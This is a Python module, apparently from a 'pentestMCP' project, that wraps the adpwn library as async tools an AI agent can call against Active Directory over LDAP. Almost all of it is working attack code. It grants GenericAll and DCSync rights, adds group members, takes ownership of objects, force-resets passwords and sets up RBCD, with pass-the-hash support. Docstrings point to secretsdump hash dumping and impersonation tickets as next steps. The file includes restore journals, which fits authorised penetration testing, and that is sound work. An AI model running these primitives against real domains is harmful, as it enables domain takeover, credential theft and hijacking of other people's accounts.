"""
adpwn_tools.py  –  LDAP privilege-escalation primitives for pentestmcp.

Calls the adpwn Python API directly (no subprocess overhead).
adpwn is vendored at /home/eric/pentestMCP/adpwn/ – one directory above this
file.  sys.path is patched on import so 'import adpwn' just works.

All functions are async so they fit the FastMCP / asyncio pattern used in
the rest of pentestMCP.  They return the standard dict shape:
  {"success": bool, "summary": str, "findings": list, "raw_output": str}
and, on write operations, a "restore_file" key pointing at the journal file
that adpwn_acl_restore() can replay to undo the change.
"""
import os
import sys

# ------------------------------------------------------------------
# Make the vendored adpwn package importable.
# This file lives at  /home/eric/pentestMCP/tools/adpwn_tools.py
# adpwn lives at      /home/eric/pentestMCP/adpwn/
# We just need to add the parent of both (/home/eric/pentestMCP) to sys.path.
# ------------------------------------------------------------------
_HERE = os.path.dirname(os.path.abspath(__file__))
_PARENT = os.path.dirname(_HERE)          # /home/eric/pentestMCP
if _PARENT not in sys.path:
    sys.path.insert(0, _PARENT)

from adpwn.config import Identity, connect_ldap, AuthError
from adpwn import primitives
from adpwn.primitives import PrimitiveError
from adpwn.exploitation import ExploitState
from adpwn.restore import RestoreOperation, RestoreException


# ------------------------------------------------------------------
# Internal helpers
# ------------------------------------------------------------------

def _make_identity(host, domain, username, password, nthash=''):
    """Build an adpwn Identity from pentestmcp-style credentials."""
    cred = password
    if nthash:
        # accept bare NTHASH or LMHASH:NTHASH
        if ':' not in nthash:
            cred = 'aad3b435b51404eeaad3b435b51404ee:' + nthash
        else:
            cred = nthash
    return Identity(user=username, password=cred, domain=domain, server=host)


def _journal(identity, operation, data):
    """Write a single-entry restore journal and return its filename."""
    state = ExploitState(identity_template=identity, acting_identity=identity)
    state.push_history(operation, data, reversible=data.get('success', True))
    return state.save_restore_data({'domain': identity.domain, 'server': identity.server})


def _err(exc):
    return {'success': False, 'summary': str(exc), 'findings': [], 'raw_output': str(exc)}


# ------------------------------------------------------------------
# Public async tools
# ------------------------------------------------------------------

async def adpwn_add_generic_all(host, domain, username, password,
                                target, trustee, nthash=''):
    """
    Grant GenericAll (full DACL control) over *target* to *trustee*.
    Equivalent to bloodyAD's 'add genericAll'.  Writes a restore journal.
    """
    try:
        identity = _make_identity(host, domain, username, password, nthash)
        conn = connect_ldap(identity)
        target_dn, _   = primitives.resolve_principal(conn, target)
        _,  trustee_sid = primitives.resolve_principal(conn, trustee)
        data = primitives.grant_full_control(conn, target_dn, trustee_sid)
        data['restore_file'] = _journal(identity, 'grant_full_control', data)
        data.setdefault('findings', [])
        data['summary'] = (
            f"GenericAll granted on {target} to {trustee}. "
            f"Restore journal: {data['restore_file']}"
        )
        data.setdefault('raw_output', str(data))
        return data
    except Exception as exc:
        return _err(exc)


async def adpwn_add_dcsync(host, domain, username, password, trustee, nthash=''):
    """
    Grant DCSync rights (GetChanges + GetChangesAll) on the domain root
    to *trustee*.  After this, run ad_dcsync / secretsdump to pull hashes.
    Writes a restore journal.
    """
    try:
        identity = _make_identity(host, domain, username, password, nthash)
        conn = connect_ldap(identity)
        _, trustee_sid = primitives.resolve_principal(conn, trustee)
        data = primitives.grant_dcsync(conn, trustee_sid)
        data['restore_file'] = _journal(identity, 'grant_dcsync', data)
        data.setdefault('findings', [])
        data['summary'] = (
            f"DCSync rights granted to {trustee}. "
            f"Restore journal: {data['restore_file']}"
        )
        data.setdefault('raw_output', str(data))
        return data
    except Exception as exc:
        return _err(exc)


async def adpwn_add_group_member(host, domain, username, password,
                                 group, member, nthash=''):
    """
    Add *member* to an AD group via LDAP.
    Equivalent to bloodyAD's 'add groupMember'.  Writes a restore journal.
    """
    try:
        identity = _make_identity(host, domain, username, password, nthash)
        conn = connect_ldap(identity)
        group_dn,  _ = primitives.resolve_principal(conn, group)
        member_dn, _ = primitives.resolve_principal(conn, member)
        data = primitives.add_group_member(conn, group_dn, member_dn)
        data['restore_file'] = _journal(identity, 'add_group_member', data)
        data.setdefault('findings', [])
        data['summary'] = (
            f"Added {member} to {group}. "
            f"Restore journal: {data['restore_file']}"
        )
        data.setdefault('raw_output', str(data))
        return data
    except Exception as exc:
        return _err(exc)


async def adpwn_remove_group_member(host, domain, username, password,
                                    group, member, nthash=''):
    """Remove *member* from an AD group via LDAP."""
    try:
        identity = _make_identity(host, domain, username, password, nthash)
        conn = connect_ldap(identity)
        group_dn,  _ = primitives.resolve_principal(conn, group)
        member_dn, _ = primitives.resolve_principal(conn, member)
        ok = primitives.remove_group_member(conn, group_dn, member_dn)
        return {
            'success': ok,
            'summary': f"Removed {member} from {group}",
            'findings': [],
            'raw_output': f'remove_group_member({group}, {member}) -> {ok}',
        }
    except Exception as exc:
        return _err(exc)


async def adpwn_set_owner(host, domain, username, password,
                          target, new_owner, nthash=''):
    """
    Change the owner of an AD object (WriteOwner privilege exploit).
    Writes a restore journal.
    """
    try:
        identity = _make_identity(host, domain, username, password, nthash)
        conn = connect_ldap(identity)
        target_dn, _  = primitives.resolve_principal(conn, target)
        _,  owner_sid = primitives.resolve_principal(conn, new_owner)
        data = primitives.write_owner(conn, target_dn, owner_sid)
        data['restore_file'] = _journal(identity, 'write_owner', data)
        data.setdefault('findings', [])
        data['summary'] = (
            f"Owner of {target} set to {new_owner}. "
            f"Restore journal: {data['restore_file']}"
        )
        data.setdefault('raw_output', str(data))
        return data
    except Exception as exc:
        return _err(exc)


async def adpwn_set_password(host, domain, username, password,
                             target, new_password, nthash=''):
    """
    Force-reset a user account password via LDAP
    (requires ForceChangePassword right on the target).
    Writes a restore journal (note: original password is NOT recoverable).
    """
    try:
        identity = _make_identity(host, domain, username, password, nthash)
        conn = connect_ldap(identity)
        target_dn, _ = primitives.resolve_principal(conn, target)
        data = primitives.reset_password(conn, target_dn, new_password)
        data['restore_file'] = _journal(identity, 'reset_password', data)
        data.setdefault('findings', [])
        data['summary'] = (
            f"Password reset for {target}. "
            f"Restore journal: {data['restore_file']} (original NOT saved)"
        )
        data.setdefault('raw_output', str(data))
        return data
    except Exception as exc:
        return _err(exc)


async def adpwn_add_rbcd(host, domain, username, password,
                         target, trustee, nthash=''):
    """
    Configure Resource-Based Constrained Delegation (RBCD) on a computer object.
    After this, use getST.py or Rubeus s4u to request the impersonation ticket.
    Writes a restore journal.
    """
    try:
        identity = _make_identity(host, domain, username, password, nthash)
        conn = connect_ldap(identity)
        target_dn,  _  = primitives.resolve_principal(conn, target)
        _, trustee_sid = primitives.resolve_principal(conn, trustee)
        data = primitives.add_rbcd(conn, target_dn, trustee_sid)
        data['restore_file'] = _journal(identity, 'add_rbcd', data)
        data.setdefault('findings', [])
        data['summary'] = (
            f"RBCD configured on {target} for {trustee}. "
            f"Restore journal: {data['restore_file']}"
        )
        data.setdefault('raw_output', str(data))
        return data
    except Exception as exc:
        return _err(exc)


async def adpwn_add_addmember_priv(host, domain, username, password,
                                   target_group, trustee, nthash=''):
    """
    Grant WriteProperty/AddMember right on a group to a trustee.
    Use when you have WriteDacl over the group but not direct membership write.
    Writes a restore journal.
    """
    try:
        identity = _make_identity(host, domain, username, password, nthash)
        conn = connect_ldap(identity)
        group_dn,   _  = primitives.resolve_principal(conn, target_group)
        _, trustee_sid = primitives.resolve_principal(conn, trustee)
        data = primitives.grant_addmember_privilege(conn, group_dn, trustee_sid)
        data['restore_file'] = _journal(identity, 'grant_addmember_privilege', data)
        data.setdefault('findings', [])
        data['summary'] = (
            f"AddMember right on {target_group} granted to {trustee}. "
            f"Restore journal: {data['restore_file']}"
        )
        data.setdefault('raw_output', str(data))
        return data
    except Exception as exc:
        return _err(exc)


async def adpwn_restore_journal(host, domain, username, password,
                                restore_file, nthash=''):
    """
    Replay an adpwn restore journal in reverse to undo all recorded LDAP changes.
    Works for both 'adpwn path' chain-walks and direct primitive calls.

    Fix (v2): RestoreOperation.run() is the correct method (not .restore()).
    Pre-populate _passwords so getpass() is never called non-interactively.
    """
    try:
        # Build credential string (same logic as _make_identity)
        cred = password
        if nthash:
            if ':' not in nthash:
                cred = 'aad3b435b51404eeaad3b435b51404ee:' + nthash
            else:
                cred = nthash

        # RestoreOperation manages its own LDAP connections and prompts for
        # passwords interactively via getpass by default.  Pre-populate the
        # internal _passwords cache keyed by (sam.lower(), domain.lower())
        # so run() never blocks waiting for stdin.
        op = RestoreOperation(restore_file, server=host)
        sam = username.split('@')[0] if '@' in username else username
        op._passwords[(sam.lower(), domain.lower())] = cred

        op.run(interactive=False)
        return {
            'success': True,
            'summary': f"Restored operations from {restore_file}",
            'findings': [],
            'raw_output': f"Restore of {restore_file} completed non-interactively",
        }
    except RestoreException as exc:
        return _err(exc)
    except AuthError as exc:
        return _err(exc)
    except Exception as exc:
        return _err(exc)
